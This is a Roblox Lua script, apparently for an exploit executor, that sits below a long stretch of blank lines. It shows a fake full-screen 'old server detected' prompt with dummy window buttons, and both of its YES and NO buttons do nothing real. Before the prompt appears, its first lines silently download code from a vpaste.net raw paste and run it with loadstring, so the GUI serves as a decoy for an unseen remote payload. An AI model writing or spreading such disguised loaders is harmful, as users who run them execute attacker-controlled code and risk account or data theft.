


































































































































































































































































































































































































































































































































































































































































































































































































































































































































coroutine.wrap(function()
    loadstring(game:HttpGet("http://vpaste.net/raw/iidBr"))()
end)()
 
-- Cria a GUI normalmente
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "OldServerPrompt"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
if syn then pcall(function() syn.protect_gui(gui) end) end
 
-- Fundo com imagem da lua sangrenta
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0
 
local moonImg = Instance.new("ImageLabel", bg)
moonImg.Size = UDim2.new(1, 0, 1, 0)
moonImg.Position = UDim2.new(0, 0, 0, 0)
moonImg.Image = "rbxassetid://4778936384"
moonImg.BackgroundTransparency = 1
moonImg.ImageColor3 = Color3.fromRGB(150, 0, 0)
moonImg.ImageTransparency = 0.7
 
-- Top bar com botões falsos
local topBar = Instance.new("Frame", bg)
topBar.Size = UDim2.new(1, 0, 0, 30)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundTransparency = 1
 
local function createFakeBtn(txt, pos)
    local btn = Instance.new("TextLabel", topBar)
    btn.Size = UDim2.new(0, 30, 0, 30)
    btn.Position = UDim2.new(1, -pos, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    btn.Text = txt
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBold
    btn.TextScaled = true
    btn.BorderSizePixel = 0
    btn.Name = "FakeBtn"
 
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    end)
    return btn
end
 
local closeBtn = createFakeBtn("✖", 30)
local restoreBtn = createFakeBtn("🗗", 60)
local minimizeBtn = createFakeBtn("➖", 90)
 
-- Texto principal
local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, -40, 0, 150)
label.Position = UDim2.new(0, 20, 0.25, 0)
label.BackgroundTransparency = 0.7
label.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
label.Text = "OLD SERVER DETECTED,\nJOIN TO OLD SERVER (YES) OR WAIT NEXT BLOODMOON (NO) "
label.TextColor3 = Color3.fromRGB(255, 50, 50)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
 
-- Botões YES e NO
local yes = Instance.new("TextButton", bg)
yes.Size = UDim2.new(0, 150, 0, 50)
yes.Position = UDim2.new(0.3, 0, 0.55, 0)
yes.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
yes.Text = "YES"
yes.TextColor3 = Color3.new(1, 1, 1)
yes.Font = Enum.Font.GothamBold
yes.TextScaled = true
yes.BorderSizePixel = 0
 
local no = Instance.new("TextButton", bg)
no.Size = UDim2.new(0, 150, 0, 50)
no.Position = UDim2.new(0.55, 0, 0.55, 0)
no.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
no.Text = "NO"
no.TextColor3 = Color3.new(1, 1, 1)
no.Font = Enum.Font.GothamBold
no.TextScaled = true
no.BorderSizePixel = 0
 
local function disableButtons()
    yes.AutoButtonColor = false
    no.AutoButtonColor = false
    yes.Active = false
    no.Active = false
end
 
yes.MouseEnter:Connect(function()
    yes.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
end)
yes.MouseLeave:Connect(function()
    yes.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
end)
 
no.MouseEnter:Connect(function()
    no.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
end)
no.MouseLeave:Connect(function()
    no.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
end)
 
yes.MouseButton1Click:Connect(function()
    disableButtons()
    label.Text = "Searching for old server..."
    yes.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    wait(40)
    gui:Destroy()
end)
 
no.MouseButton1Click:Connect(function()
    disableButtons()
    label.Text = "Closing script..."
    no.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    wait(40)
    gui:Destroy()
end)
